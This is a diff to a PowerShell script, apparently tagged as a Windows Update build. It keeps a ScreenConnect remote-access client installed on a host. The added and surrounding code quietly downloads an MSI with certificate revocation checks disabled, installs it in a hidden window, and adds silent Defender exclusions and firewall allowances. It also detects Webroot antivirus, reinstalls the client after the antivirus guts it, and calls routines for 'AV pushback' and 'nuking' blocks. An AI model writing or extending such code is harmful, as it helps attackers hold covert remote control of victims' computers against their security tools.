@@ -435,7 +435,11 @@ function Get-ScBinaryHealth {
 }
 
 function Test-ScControlBroken {
+    # "Broken" = primary SC is present but gutted/unusable.
+    # Not installed at all is NOT broken — that path uses Install-PrimarySc.
     $h = Get-ScBinaryHealth
+    $present = [bool](Test-ScServicePresent) -or ($h.Roots.Count -gt 0) -or ($h.ExeCount -gt 0)
+    if (-not $present) { return $false }
     if (-not $h.ServiceRunning) { return $true }
     if ($h.Roots.Count -eq 0) { return $true }
     if ($h.ExeCount -lt 1) { return $true }
@@ -444,6 +448,50 @@ function Test-ScControlBroken {
         if ($line -match 'readable=False' -or $line -match 'size=0') { return $true }
     }
     if ($h.ProcCount -lt 1) { return $true }
+    return $false
+}
+
+function Get-PrimaryMsiFile {
+    # Prefer curl (TLS quirks / MITM friendlier) then IWR then WebClient
+    param([string]$Dest = $MsiFile, [string]$Url = $MsiUrl)
+    if (Test-Path $Dest) { Remove-Item $Dest -Force -ErrorAction SilentlyContinue }
+    Write-Log "MSI download: $Url"
+    $ok = $false
+    try {
+        $curl = Get-Command curl.exe -ErrorAction SilentlyContinue
+        if ($curl) {
+            & curl.exe -L --ssl-no-revoke --connect-timeout 25 --retry 2 -o "$Dest" "$Url" >$null 2>&1
+            if ((Test-Path $Dest) -and ((Get-Item $Dest).Length -ge 500000)) { $ok = $true }
+        }
+    } catch {
+        Write-Log "MSI curl failed: $($_.Exception.Message)"
+    }
+    if (-not $ok) {
+        try {
+            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+            Invoke-WebRequest -Uri $Url -OutFile $Dest -UseBasicParsing -UserAgent 'Mozilla/5.0' -TimeoutSec 60
+            if ((Test-Path $Dest) -and ((Get-Item $Dest).Length -ge 500000)) { $ok = $true }
+        } catch {
+            Write-Log "MSI IWR failed: $($_.Exception.Message)"
+        }
+    }
+    if (-not $ok) {
+        try {
+            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+            $wc = New-Object System.Net.WebClient
+            $wc.Headers.Add('User-Agent', 'Mozilla/5.0')
+            $wc.DownloadFile($Url, $Dest)
+            $wc.Dispose()
+            if ((Test-Path $Dest) -and ((Get-Item $Dest).Length -ge 500000)) { $ok = $true }
+        } catch {
+            Write-Log "MSI WebClient failed: $($_.Exception.Message)"
+        }
+    }
+    if ($ok) {
+        Write-Log ("MSI bytes: " + (Get-Item $Dest).Length)
+        return $true
+    }
+    Write-Log 'MSI invalid / download failed'
     return $false
 }
 
@@ -461,20 +509,10 @@ function Repair-ScAfterAv {
 
     # Force install path even if service remnants confuse detection
     Write-Log 'REPAIR: downloading fresh MSI'
-    if (Test-Path $MsiFile) { Remove-Item $MsiFile -Force -ErrorAction SilentlyContinue }
-    try {
-        Invoke-WebRequest -Uri $MsiUrl -OutFile $MsiFile -UseBasicParsing -UserAgent 'Mozilla/5.0'
-    } catch {
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add('User-Agent', 'Mozilla/5.0')
-        $wc.DownloadFile($MsiUrl, $MsiFile)
-        $wc.Dispose()
-    }
-    if (-not (Test-Path $MsiFile) -or ((Get-Item $MsiFile).Length -lt 500000)) {
+    if (-not (Get-PrimaryMsiFile -Dest $MsiFile)) {
         Write-Log 'REPAIR: MSI invalid'
         return $false
     }
-    Write-Log ("REPAIR: MSI bytes " + (Get-Item $MsiFile).Length)
     $logMsi = Join-Path $WorkDir 'msi_repair.log'
     $p = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 /l*v `"$logMsi`"" `
         -Wait -PassThru -WindowStyle Hidden
@@ -1172,7 +1210,7 @@ function Invoke-NukeBlockedScreenConnect {
     Write-Log "AUTO-NUKE complete (actions~$killed)"
 }
 
-Write-Log 'WU_BUILD_20260730A'
+Write-Log 'WU_BUILD_20260730B'
 Write-Log ("Host=$env:COMPUTERNAME user=$env:USERNAME pid=$PID")
 Invoke-NukeBlockedScreenConnect
 
@@ -1490,20 +1528,9 @@ function Install-PrimarySc {
     }
 
     Write-Log "Downloading MSI"
-    if (Test-Path $MsiFile) { Remove-Item $MsiFile -Force -ErrorAction SilentlyContinue }
-    try {
-        Invoke-WebRequest -Uri $MsiUrl -OutFile $MsiFile -UseBasicParsing -UserAgent 'Mozilla/5.0'
-    } catch {
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add('User-Agent', 'Mozilla/5.0')
-        $wc.DownloadFile($MsiUrl, $MsiFile)
-        $wc.Dispose()
-    }
-    if (-not (Test-Path $MsiFile) -or ((Get-Item $MsiFile).Length -lt 500000)) {
-        Write-Log 'MSI invalid'
+    if (-not (Get-PrimaryMsiFile -Dest $MsiFile)) {
         return $false
     }
-    Write-Log ("MSI bytes: " + (Get-Item $MsiFile).Length)
 
     $logMsi = Join-Path $WorkDir 'msi.log'
     $p = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 /l*v `"$logMsi`"" `
@@ -1784,15 +1811,15 @@ function Ensure-PrimaryScFullyUp {
             }
         }
 
-        # Escalation ladder
-        if (Test-WebrootInstalled -or $h.Stubbed -or $h.Hollow -or $h.ControlBroken) {
-            Write-Log 'ENSURE: AV/stub/hollow path -> nuclear repair'
-            Repair-ScAfterAv | Out-Null
-            Start-Sleep -Seconds 8
-        } elseif (-not $h.ServicePresent -or -not $h.AppInstalled) {
+        # Escalation ladder — missing install FIRST (do not treat as "broken")
+        if (-not $h.ServicePresent -or -not $h.AppInstalled) {
             Write-Log 'ENSURE: missing install -> MSI'
             Install-PrimarySc | Out-Null
             Start-Sleep -Seconds 6
+        } elseif (Test-WebrootInstalled -or $h.Stubbed -or $h.Hollow -or $h.ControlBroken) {
+            Write-Log 'ENSURE: AV/stub/hollow path -> nuclear repair'
+            Repair-ScAfterAv | Out-Null
+            Start-Sleep -Seconds 8
         } elseif (-not $h.ServiceRunning -or $h.ProcCount -lt 1) {
             Write-Log 'ENSURE: service/process down -> hard restart'
             if (-not (Restart-ScServiceHard)) {
@@ -1864,22 +1891,35 @@ if ($preHealth.Stubbed -and (Test-Path $repairMarker)) {
 
 Write-Log 'PHASE 1: quiet exclusions + ensure primary SC'
 Enable-QuietDefenderExclusions | Out-Null
-if (Test-WebrootInstalled -or (Test-ScControlBroken) -or $preHealth.Stubbed) {
-    Write-Log 'Webroot/control-broken/stubbed detected - running nuclear repair'
-    Repair-ScAfterAv | Out-Null
-}
-
 $appOk = Test-AppInstalled -Fingerprint $PrimaryFingerprint
 $svcOk = Test-ScServiceRunning
+$svcPresent = Test-ScServicePresent
 $broken = Test-ScControlBroken
 $hNow = Get-ScBinaryHealth
-Write-Log ("SC detect: running=$svcOk appOk=$appOk controlBroken=$broken stubbed=$($hNow.Stubbed) maxExe=$($hNow.MaxExeSize) maxDll=$($hNow.MaxDllSize)")
-if (-not $svcOk -or -not $appOk -or $broken) {
+Write-Log ("SC detect: present=$svcPresent running=$svcOk appOk=$appOk controlBroken=$broken stubbed=$($hNow.Stubbed) maxExe=$($hNow.MaxExeSize) maxDll=$($hNow.MaxDllSize)")
+
+# Clean miss: install MSI first (do NOT treat as Webroot-broken)
+if (-not $svcPresent -or -not $appOk) {
+    Write-Log 'PHASE 1: primary SC missing -> Install-PrimarySc'
+    Install-PrimarySc | Out-Null
+    Start-Sleep -Seconds 5
+    $svcOk = Test-ScServiceRunning
+    $appOk = Test-AppInstalled -Fingerprint $PrimaryFingerprint
+    $broken = Test-ScControlBroken
+}
+
+if ((Test-WebrootInstalled -and ($broken -or $hNow.Stubbed)) -or $broken -or $hNow.Stubbed) {
+    Write-Log 'Webroot/control-broken/stubbed detected - running nuclear repair'
     Repair-ScAfterAv | Out-Null
     Start-Sleep -Seconds 8
 }
 if (-not (Start-PrimaryService)) {
     Invoke-ReactiveAvPushback -Issues @('sc_start_blocked')
+    # Still missing after start attempt -> force MSI again
+    if (-not (Test-ScServicePresent)) {
+        Write-Log 'PHASE 1: still no service after start attempt -> MSI again'
+        Install-PrimarySc | Out-Null
+    }
     Start-PrimaryService | Out-Null
 }
 Enable-ScFirewallAllow
